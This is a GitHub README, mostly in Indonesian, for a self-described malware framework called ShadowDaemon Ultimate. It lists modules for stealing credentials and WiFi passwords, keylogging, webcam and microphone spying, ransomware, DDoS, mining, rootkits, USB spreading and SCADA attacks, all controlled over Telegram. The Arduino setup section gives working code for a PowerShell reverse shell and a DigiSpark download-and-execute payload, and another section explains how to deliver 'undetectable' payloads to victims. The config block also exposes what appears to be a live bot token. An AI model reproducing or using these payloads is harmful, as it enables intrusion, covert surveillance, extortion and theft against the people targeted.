# 🐉 SHADOWDAEMON ULTIMATE EDITION

<img width="1254" height="1254" alt="1000294753" src="https://github.com/user-attachments/assets/dfe97fc5-f98e-47e5-8dd2-e03a1ddb372f" />

> *"hack the system. own the root. stay anonymous."*

[![Version](https://img.shields.io/badge/version-2.0-red.svg)](https://github.com/xoxo/ShadowDaemon)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![Python](https://img.shields.io/badge/python-3.8+-green.svg)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Android-orange.svg)](https://termux.com/)

> **⚠️ DISCLAIMER:** This tool is for **educational and research purposes only**. Use only on systems you own or have explicit permission to test. The author is not responsible for any misuse or damage caused by this tool.

---

## 📌 TABLE OF CONTENTS

- [Overview](#-overview)
- [Features](#-features)
- [Architecture](#-architecture)
- [Installation](#-installation)
- [Configuration](#-configuration)
- [Usage](#-usage)
- [Commands Reference](#-commands-reference)
- [Modules Explanation](#-modules-explanation)
- [USB Attacks](#-usb-attacks)
- [Arduino Setup](#-arduino-setup)
- [Payload Generation](#-payload-generation)
- [Telegram Bot Setup](#-telegram-bot-setup)
- [Troubleshooting](#-troubleshooting)
- [FAQ](#-faq)
- [License](#-license)

---

## 🔥 OVERVIEW

**ShadowDaemon Ultimate** adalah **Malware Framework** lengkap untuk Linux dan Termux (Android). Dengan 30+ modul, lo bisa melakukan berbagai macam serangan dari **Reconnaissance** sampe **Kernel Rootkit** dan **SCADA Exploitation**.

```
root@shadow:~# whoami
shadow_demon

> nmap -sS -T4 -A target
> scan complete
> ports: 22/open 80/open 443/open
> system info
> os: Linux
> kernel: 6.6.0
> uptime: 2d 14h 37m
> access granted

Linux is freedom. Knowledge is power.
```

### ⚡ Key Highlights

- **30+ Modules** - Dari basic sampai advanced
- **Multi-C2 Support** - Telegram & Firebase
- **Persistence Mechanisms** - systemd, cron, rc.local
- **Kernel-Level Rootkit** - Process hiding
- **SCADA/ICS Exploitation** - Stuxnet-style
- **CPU Microcode Injection** - Level paling dalam
- **Hardware Attacks** - USB keylogger, Rubber Ducky
- **Cross-Platform** - Linux & Termux (Android)

---

## 🎯 FEATURES

### 🕵️ Reconnaissance
| Module | Fungsi |
|--------|--------|
| `geo_tracker.py` | Lacak lokasi korban via IP |
| `network_exploiter.py` | Scan jaringan dan discovery |
| `wifi_stealer.py` | Curi password WiFi |
| `password_stealer.py` | Curi password browser (Chrome/Firefox) |
| `shell.py` | Eksekusi perintah shell jarak jauh |

### 🎥 Monitoring & Surveillance
| Module | Fungsi |
|--------|--------|
| `screenshot.py` | Ambil screenshot layar |
| `webcam.py` | Ambil foto dari webcam |
| `mic.py` | Rekam suara dari mikrofon |
| `screen_recorder.py` | Rekam layar (video) |
| `keylogger.py` | Rekam semua ketikan korban |

### 💀 Attack Vectors
| Module | Fungsi |
|--------|--------|
| `ssh_bruteforce.py` | SSH Bruteforce |
| `ddos.py` | DDoS (UDP flood, SYN flood) |
| `ransomware.py` | Ransomware (AES-256 encryption) |
| `network_exploiter.py` | DNS Amplification, MAC flooding |
| `plc_scada.py` | Industrial protocol flooding |

### 🔒 Persistence & Evasion
| Module | Fungsi |
|--------|--------|
| `persistence.py` | Auto-start via systemd/cron |
| `hider.py` | Process hiding (kernel level) |
| `anti_forensic.py` | Anti-forensic capabilities |
| `crypter.py` | Binary encryption (FUD) |

### 🎛️ Advanced Exploitation
| Module | Fungsi |
|--------|--------|
| `bootkit.py` | Bootloader infection (GRUB/Syslinux) |
| `bios_rootkit.py` | BIOS/UEFI rootkit |
| `cpu_microcode.py` | CPU microcode patching |
| `plc_scada.py` | PLC/SCADA attacks (Stuxnet-style) |

### 🔧 Hardware Attacks
| Module | Fungsi |
|--------|--------|
| `usb_spreader.py` | USB auto-spreader |
| `hardware_keylogger.py` | Hardware keylogger (Arduino/Teensy) |
| `usb_rubber_ducky.py` | USB Rubber Ducky payload generation |

### 📡 C2 Channels
| Module | Fungsi |
|--------|--------|
| `telegram_c2.py` | Telegram Bot C2 |
| `firebase_c2.py` | Firebase Realtime Database C2 |
| `dns_tunneling.py` | DNS Tunneling (data exfiltration) |

---

## 🏗️ ARCHITECTURE

```
ShadowDaemon_Ultimate/
├── shadow.py                          # Main controller
├── config.json                        # Configuration file
├── requirements.txt                   # Python dependencies
├── setup.sh                          # Installer script
├── Makefile                          # Build system
├── wordlist.txt                      # SSH brute force wordlist
├── README.md                         # Documentation
│
├── modules/                          # All modules (30+ files)
│   ├── __init__.py
│   ├── shell.py                      # Remote shell execution
│   ├── keylogger.py                  # Keystroke logging
│   ├── webcam.py                     # Webcam capture
│   ├── mic.py                        # Microphone recording
│   ├── screenshot.py                 # Screenshot capture
│   ├── ransomware.py                 # AES-256 ransomware
│   ├── miner.py                      # Crypto mining (Monero)
│   ├── ddos.py                       # DDoS attacks
│   ├── persistence.py                # Auto-start mechanisms
│   ├── payload_gen.py                # FUD payload generator
│   ├── crypter.py                    # Binary encryption
│   ├── usb_spreader.py               # USB auto-infection
│   ├── password_stealer.py           # Browser credentials
│   ├── screen_recorder.py            # Video recording
│   ├── geo_tracker.py                # Location tracking
│   ├── wifi_stealer.py               # WiFi passwords
│   ├── remote_control.py             # Mouse/keyboard control
│   ├── scheduler.py                  # Scheduled tasks
│   ├── anti_forensic.py              # Evidence wiping
│   ├── hider.py                      # Process hiding
│   ├── ssh_bruteforce.py             # SSH attacks
│   ├── port_knocking.py              # Firewall bypass
│   ├── dns_tunneling.py              # DNS exfiltration
│   ├── cpu_microcode.py              # CPU backdoor
│   ├── network_exploiter.py          # Network attacks
│   ├── plc_scada.py                  # ICS exploitation
│   ├── bootkit.py                    # Bootloader infection
│   ├── bios_rootkit.py               # Firmware infection
│   ├── hardware_keylogger.py         # USB keylogger
│   └── usb_rubber_ducky.py           # Ducky payloads
│
├── c2/                               # C2 communication
│   ├── __init__.py
│   ├── telegram_c2.py                # Telegram bot C2
│   └── firebase_c2.py                # Firebase API C2
│
└── kernel/                           # Kernel rootkit
    ├── shadow.c                      # LKM rootkit source
    └── Makefile                      # Kernel build file
```

---

## 📥 INSTALLATION

### Prerequisites

| Component | Requirement |
|-----------|-------------|
| OS | Linux (Ubuntu/Debian/Kali) or Android (Termux) |
| Python | 3.8 or higher |
| RAM | Minimum 4GB (8GB recommended) |
| Storage | 500MB free space |
| Internet | Required for C2 communication |

### Installation on Termux (Android)

```bash
# Install Termux from F-Droid (NOT Play Store!)
# https://f-droid.org/en/packages/com.termux/

# Setup storage
termux-setup-storage

# Update packages
pkg update && pkg upgrade -y

# Install dependencies
pkg install -y python git wget curl
pkg install -y scrot fswebcam alsa-utils nmap net-tools
pkg install -y openjdk-17 gradle apktool

# Clone or create project
git clone https://github.com/yourusername/ShadowDaemon_Ultimate.git
cd ShadowDaemon_Ultimate

# Setup
chmod +x setup.sh
./setup.sh

# Install Python packages
pip install -r requirements.txt
```

### Installation on Linux (Ubuntu/Debian/Kali)

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install dependencies
sudo apt install -y python3 python3-pip git wget curl
sudo apt install -y scrot fswebcam alsa-utils nmap net-tools
sudo apt install -y ffmpeg xdotool build-essential linux-headers-$(uname -r)

# Clone repository
git clone https://github.com/yourusername/ShadowDaemon_Ultimate.git
cd ShadowDaemon_Ultimate

# Run installer
chmod +x setup.sh
./setup.sh

# Install Python packages
pip3 install -r requirements.txt
```

---

## ⚙️ CONFIGURATION

### Config File: `config.json`

```json
{
    "c2_type": "telegram",
    "telegram_token": "8956135458:AAF4LZiAnrOOyC7Nu-I8FIaeRIn6F0G2f68",
    "telegram_chat_id": "752995113",
    "firebase_url": "https://your-project.firebaseio.com/commands/{uid}.json",
    "persistence": false,
    "miner_wallet": "YOUR_MONERO_WALLET_ADDRESS",
    "miner_pool": "pool.supportxmr.com:3333",
    "target_ip": "192.168.1.1",
    "subnet": "192.168.1.0/24",
    "auto_start_modules": ["keylogger", "geo_tracker"]
}
```

### Setting Up Telegram Bot

1. **Create Bot:**
   ```
   Open Telegram → Search @BotFather → Send /newbot
   → Name: ShadowDaemonBot
   → Username: ShadowDaemon_bot
   → Copy TOKEN
   ```

2. **Get Chat ID:**
   ```
   Send message to your bot
   Visit: https://api.telegram.org/bot<TOKEN>/getUpdates
   Find "chat":{"id": 123456789}
   ```

3. **Update Config:**
   ```json
   "telegram_token": "123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ",
   "telegram_chat_id": "123456789"
   ```

---

## 🚀 USAGE

### Start ShadowDaemon

```bash
# Run in foreground
python3 shadow.py

# Run in background
nohup python3 shadow.py > shadow.log 2>&1 &

# Check logs
tail -f shadow.log
```

### Initial Output

```
╔═══════════════════════════════════════════════════════════╗
║   SHADOWDAEMON ULTIMATE EDITION vTermux 2.0              ║
║   イズミー Active 😈🔥                                    ║
║   Complete Malware Framework for Termux                  ║
║   From Basic to Apocalyptic Level                        ║
╚═══════════════════════════════════════════════════════════╝
[*] ShadowDaemon is running... Waiting for commands...
```

### Telegram Notification

```
🚀 ShadowDaemon Ultimate vTermux 2.0 aktif!
💻 OS: Android 11
🌐 IP: 192.168.1.100
🆔 UID: termux-xxx
```

---

## 📋 COMMANDS REFERENCE

### 🏠 Basic Commands

| Command | Description | Example |
|---------|-------------|---------|
| `help` | Show all commands | `help` |
| `info` | System information | `info` |
| `shell:<cmd>` | Execute shell command | `shell:ls -la` |
| `selfdestruct` | Destroy malware | `selfdestruct` |

### 🕵️ Reconnaissance

| Command | Description | Example |
|---------|-------------|---------|
| `geo_location` | Get victim location | `geo_location` |
| `wifi_pass` | Steal WiFi passwords | `wifi_pass` |
| `scan_network` | Scan local network | `scan_network` |
| `steal_passwords` | Steal browser passwords | `steal_passwords` |

### 🎥 Monitoring

| Command | Description | Example |
|---------|-------------|---------|
| `screenshot` | Take screenshot | `screenshot` |
| `webcam` | Capture webcam | `webcam` |
| `mic` | Record microphone (10s) | `mic` |
| `record_screen` | Record screen (30s) | `record_screen` |
| `keylog_start` | Start keylogger | `keylog_start` |
| `keylog_stop` | Stop keylogger | `keylog_stop` |
| `keylog_get` | Get captured keystrokes | `keylog_get` |

### 💀 Attacks

| Command | Description | Example |
|---------|-------------|---------|
| `ransomware` | Encrypt /home files | `ransomware` |
| `ddos:<ip> <port>` | DDoS attack | `ddos:192.168.1.1 80` |
| `knock:<ip>` | Port knocking | `knock:192.168.1.1` |
| `network_exploit:<type>` | Network attacks | `network_exploit:mac_flood` |
| `industrial_flood` | Flood SCADA protocols | `industrial_flood` |

### ⛏️ Mining

| Command | Description | Example |
|---------|-------------|---------|
| `miner_start` | Start crypto mining | `miner_start` |
| `miner_stop` | Stop crypto mining | `miner_stop` |

### 🔒 Persistence

| Command | Description | Example |
|---------|-------------|---------|
| `persist` | Install persistence | `persist` |
| `hide_self` | Hide process | `hide_self` |
| `wipe_trails` | Wipe forensic evidence | `wipe_trails` |

### 💾 USB Attacks

| Command | Description | Example |
|---------|-------------|---------|
| `usb_spread` | Auto-infect USB drives | `usb_spread` |
| `setup_usb_keylogger` | Setup hardware keylogger | `setup_usb_keylogger` |
| `create_ducky:<type>` | Create Rubber Ducky payload | `create_ducky:reverse_shell` |

### 🔬 Advanced Exploits

| Command | Description | Example |
|---------|-------------|---------|
| `install_bootkit` | Infect bootloader | `install_bootkit` |
| `install_bios_rootkit` | Infect BIOS/UEFI | `install_bios_rootkit` |
| `install_cpu_backdoor` | CPU microcode injection | `install_cpu_backdoor` |
| `trigger_smm:<cmd>` | Trigger SMM backdoor | `trigger_smm:2` |
| `scan_plc:<subnet>` | Scan for PLCs | `scan_plc:192.168.1.0/24` |
| `stuxnet:<target>` | Deploy Stuxnet payload | `stuxnet:192.168.1.50` |

---

## 🧩 MODULES EXPLANATION

### Reconnaissance Modules

| Module | File | Fungsi |
|--------|------|--------|
| Geolocation | `geo_tracker.py` | Lacak lokasi korban via IP |
| WiFi Stealer | `wifi_stealer.py` | Curi password WiFi yang tersimpan |
| Password Stealer | `password_stealer.py` | Curi password dari browser |
| Network Scanner | `network_exploiter.py` | Scan perangkat di jaringan |

### Monitoring Modules

| Module | File | Fungsi |
|--------|------|--------|
| Keylogger | `keylogger.py` | Rekam semua ketikan |
| Screenshot | `screenshot.py` | Ambil screenshot layar |
| Webcam | `webcam.py` | Ambil foto dari webcam |
| Microphone | `mic.py` | Rekam suara ruangan |
| Screen Recorder | `screen_recorder.py` | Rekam layar (video) |

### Attack Modules

| Module | File | Fungsi |
|--------|------|--------|
| Ransomware | `ransomware.py` | Enkripsi file dengan AES-256 |
| DDoS | `ddos.py` | UDP flood attack |
| SSH Bruteforce | `ssh_bruteforce.py` | Bruteforce SSH |
| Port Knocking | `port_knocking.py` | Buka firewall dengan knock |

### Advanced Modules

| Module | File | Fungsi |
|--------|------|--------|
| Bootkit | `bootkit.py` | Infect bootloader GRUB/Syslinux |
| BIOS Rootkit | `bios_rootkit.py` | Infect BIOS/UEFI |
| CPU Microcode | `cpu_microcode.py` | Inject backdoor ke CPU |
| PLC/SCADA | `plc_scada.py` | Stuxnet-style SCADA attacks |

### USB/Hardware Modules

| Module | File | Fungsi |
|--------|------|--------|
| USB Spreader | `usb_spreader.py` | Auto-infect USB |
| Hardware Keylogger | `hardware_keylogger.py` | Arduino/Teensy keylogger |
| USB Rubber Ducky | `usb_rubber_ducky.py` | Ducky payload generator |

---

## 🔌 USB ATTACKS

### Jenis 1: USB Spreader (Software)
- **TIDAK** butuh USB fisik
- Malware nyebar otomatis ke USB yang dicolok
- Command: `usb_spread`

### Jenis 2: Hardware Keylogger (Fisik)
- **BUTUH** Arduino/Teensy
- Rekam ketikan korban diam-diam
- Command: `setup_usb_keylogger`

### Jenis 3: USB Rubber Ducky
- **BUTUH** Arduino Leonardo / Rubber Ducky
- Eksekusi payload dalam 5 detik
- Command: `create_ducky:reverse_shell`

### Perbandingan

| Fitur | USB Spreader | Hardware Keylogger | USB Rubber Ducky |
|-------|-------------|-------------------|------------------|
| **Butuh USB Fisik?** | ❌ Tidak | ✅ Ya | ✅ Ya |
| **Biaya** | Gratis | Rp 50-300 ribu | Rp 30-800 ribu |
| **Cara Pakai** | Malware jalan | Colok USB | Colok USB |
| **Fungsi** | Nyebar malware | Rekam ketikan | Eksekusi payload |
| **Kecepatan** | Pelan | Cepat | Sangat cepat |

---

## 🔧 ARDUINO SETUP

### 📦 Yang Lo Butuhkan

| No | Perangkat | Harga | Fungsi |
|----|-----------|-------|--------|
| 1 | Arduino Leonardo | Rp 100-150 ribu | USB Rubber Ducky / Keylogger |
| 2 | Arduino Nano/Uno | Rp 50-100 ribu | Hardware Keylogger |
| 3 | DigiSpark | Rp 30-50 ribu | USB Rubber Ducky (murah) |
| 4 | USB Cable | Rp 10-20 ribu | Koneksi ke PC |

### 🔧 Setup Arduino IDE

#### Step 1: Download Arduino IDE
```bash
# Download dari website resmi
https://www.arduino.cc/en/software

# Linux (Ubuntu/Debian)
sudo apt install arduino arduino-core -y
```

#### Step 2: Install Board Support

**Untuk Arduino Leonardo:**
```
Tools → Board → Boards Manager
Cari "Arduino AVR Boards" → Install
```

**Untuk DigiSpark:**
```
File → Preferences
Tambahkan URL:
https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json

Tools → Board → Boards Manager
Cari "Digistump" → Install
```

---

### 🦆 Setup USB Rubber Ducky (Arduino Leonardo)

#### Step 1: Generate Payload di Termux
```bash
create_ducky:reverse_shell
# Output: ducky_script.txt
```

#### Step 2: Convert ke Arduino Code
```cpp
// USB Rubber Ducky - Arduino Leonardo
// イズミー Active 😈🔥

#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(2000);
  
  // Buka Run (Windows Key + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  
  // Ketik perintah
  Keyboard.println("powershell -Command \"$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
  
  delay(100);
  Keyboard.end();
}

void loop() {}
```

**Ganti `YOUR_IP` dengan IP server lo!**

#### Step 3: Upload ke Arduino
```
1. Colok Arduino Leonardo ke PC via USB
2. Tools → Board → Arduino Leonardo
3. Tools → Port → Pilih COMx (Windows) atau /dev/ttyACM0 (Linux)
4. Klik Upload (→) icon
5. Tunggu sampai selesai
```

#### Step 4: Tes
```
Colok Arduino ke PC target
➜ Dalam 5 detik, malware jalan!
```

---

### ⌨️ Setup Hardware Keylogger (Arduino Nano/Uno)

#### Step 1: Generate Firmware di Termux
```bash
setup_usb_keylogger
# Output: usb_keylogger.ino
```

#### Step 2: Upload ke Arduino
```cpp
// Hardware Keylogger - Arduino Nano/Uno
// イズミー Active 😈🔥

#include <SoftwareSerial.h>

#define RX 10
#define TX 11
SoftwareSerial mySerial(RX, TX);

String keylog = "";

void setup() {
  Serial.begin(9600);
  mySerial.begin(9600);
  Serial.println("[*] Keylogger Ready");
}

void loop() {
  // Baca dari serial
  if (mySerial.available()) {
    char c = mySerial.read();
    keylog += c;
    if (keylog.length() > 1024) {
      keylog = "";
    }
  }
  
  // Kirim log via serial
  if (Serial.available()) {
    String cmd = Serial.readString();
    if (cmd == "GET_LOG") {
      Serial.println(keylog);
      keylog = "";
    }
  }
  
  delay(10);
}
```

#### Step 3: Upload ke Arduino
```
1. Colok Arduino Nano ke PC via USB
2. Tools → Board → Arduino Nano
3. Tools → Port → Pilih COMx
4. Klik Upload
```

#### Step 4: Baca Keylog
```bash
# Di Termux
python3 -c "
import serial
ser = serial.Serial('/dev/ttyUSB0', 9600, timeout=2)
ser.write(b'GET_LOG')
print(ser.read(ser.in_waiting).decode())
"
```

---

### 💰 Setup DigiSpark (Alternatif Murah)

#### Step 1: Install DigiSpark Board
```
File → Preferences
Tambahkan URL:
https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json

Tools → Board → Boards Manager
Cari "Digistump" → Install
```

#### Step 2: Upload Payload
```cpp
// DigiSpark Payload
// イズミー Active 😈🔥

#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -Command \"Invoke-WebRequest -Uri 'http://YOUR_IP/shadow.py' -OutFile '%temp%\\shadow.py'; Start-Process 'python' '%temp%\\shadow.py'\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
```

#### Step 3: Upload
```
1. Colok DigiSpark ke PC
2. Tools → Board → Digistump AVR Boards → Digispark Default
3. Tools → Programmer → Micronucleus
4. Klik Upload
5. Cabut dan colok lagi untuk trigger
```

---

### 📊 Perbandingan Harga & Fungsi

| Perangkat | Harga | Fungsi | Kecepatan | Kesulitan |
|-----------|-------|--------|-----------|-----------|
| Arduino Leonardo | Rp 100-150k | Rubber Ducky | ⚡ Sangat Cepat | 🟢 Mudah |
| Arduino Nano | Rp 50-100k | Keylogger | 🐢 Sedang | 🟡 Sedang |
| DigiSpark | Rp 30-50k | Rubber Ducky | ⚡ Cepat | 🟢 Mudah |
| USB Rubber Ducky Asli | Rp 500-800k | Rubber Ducky | ⚡ Sangat Cepat | 🟢 Mudah |

---

## 🚀 PAYLOAD GENERATION

### Generate FUD Payload

```bash
# Generate payload
gen_payload

# Output: payload_xxxxxx.py
# File ini sudah di-enkripsi dan FUD (Fully Undetectable)
```

### Kirim ke Target

```bash
# 1. Kirim via Telegram/WhatsApp
# 2. Target download dan jalankan:
python3 payload_xxxxxx.py

# 3. Malware aktif, lo bisa kontrol dari Telegram!
```

### Buat .exe (Windows)

```bash
# Install pyinstaller
pip install pyinstaller

# Buat .exe
pyinstaller --onefile --noconsole payload_xxxxxx.py

# Hasil: dist/payload_xxxxxx.exe
# Kirim ke target Windows
```

---

## 🤖 TELEGRAM BOT SETUP

### Step 1: Create Bot

```
Open Telegram → Search @BotFather → Send /newbot
→ Name: ShadowDaemonBot
→ Username: ShadowDaemon_bot
→ Copy TOKEN
```

### Step 2: Get Chat ID

```
Send message to your bot
Visit: https://api.telegram.org/bot<TOKEN>/getUpdates
Find "chat":{"id": 123456789}
```

### Step 3: Update Config

```json
"telegram_token": "123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ",
"telegram_chat_id": "123456789"
```

### Step 4: Test Bot

```bash
curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" -d "chat_id=<CHAT_ID>&text=ShadowDaemon%20aktif!"
```

---

## 🐛 TROUBLESHOOTING

### Common Issues

#### ModuleNotFoundError
```bash
pip install -r requirements.txt
```

#### Permission Denied (/tmp)
```bash
# Bikin file di folder project
touch .shadow_key
chmod 666 .shadow_key
```

#### JSONDecodeError
```bash
# Bikin config.json baru
cat > config.json << 'EOF'
{
    "c2_type": "telegram",
    "telegram_token": "YOUR_TOKEN",
    "telegram_chat_id": "YOUR_CHAT_ID",
    ...
}
EOF
```

#### Cannot Connect to Telegram
- Check internet connection
- Verify token in config.json
- Check bot is not blocked

#### Kernel Module Won't Load
```bash
sudo apt install linux-headers-$(uname -r)
cd kernel && make
```

---

## ❓ FAQ

### Q: Apa itu ShadowDaemon Ultimate?
**A:** Framework malware lengkap untuk Linux/Termux dengan 30+ modul dari basic hingga kernel rootkit.

### Q: Apakah ini ilegal?
**A:** Ya, jika digunakan tanpa izin. Hanya untuk edukasi dan testing sendiri.

### Q: Bagaimana cara setup Telegram bot?
**A:** Cari @BotFather di Telegram, buat bot, copy token, dan dapatkan chat ID dari getUpdates.

### Q: Apakah bisa jalan di Windows?
**A:** Tidak, khusus Linux. Tapi payload bisa untuk Windows (Rubber Ducky).

### Q: Berapa biaya untuk hardware keylogger?
**A:** Rp 50-300 ribu untuk Arduino/Teensy.

### Q: Apakah kernel rootkit berbahaya?
**A:** Ya, bisa bikin sistem crash atau brick. Hanya untuk testing di lab.

---

## ⚠️ FINAL WARNING

```
╔═══════════════════════════════════════════════════════════════╗
║                      ⚠️  WARNING  ⚠️                         ║
║                                                               ║
║  This tool is intended for EDUCATIONAL PURPOSES only.        ║
║  Using this tool against systems without authorization       ║
║  is ILLEGAL and can result in severe penalties.              ║
║                                                               ║
║  By using this tool, you agree to:                           ║
║  1. Use it only on systems you own                           ║
║  2. Use it only for legitimate security testing              ║
║  3. Accept full responsibility for your actions              ║
║  4. Not hold the author responsible for any misuse           ║
║                                                               ║
║  🔒 STAY SAFE, STAY LEGAL 🔒                                 ║
╚═══════════════════════════════════════════════════════════════╝
```

---

## 📜 LICENSE

This project is licensed under the **MIT License**.

```
MIT License

Copyright (c) 2024 イズミー

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## ⭐ STAR US

If you find this project useful, please give it a star on GitHub!

[![GitHub stars](https://img.shields.io/github/stars/yourusername/ShadowDaemon_Ultimate.svg?style=social&label=Star)](https://github.com/yourusername/ShadowDaemon_Ultimate)

---

<div align="center">
  <sub>Built with 🔥 by イズミー</sub>
  <br>
  <sub>© 2024 ShadowDaemon Ultimate Edition</sub>
  <br>
  <sub>⚠️ For Educational Purposes Only ⚠️</sub>
  <br>
  <sub>Linux is freedom. Knowledge is power.</sub>
</div>
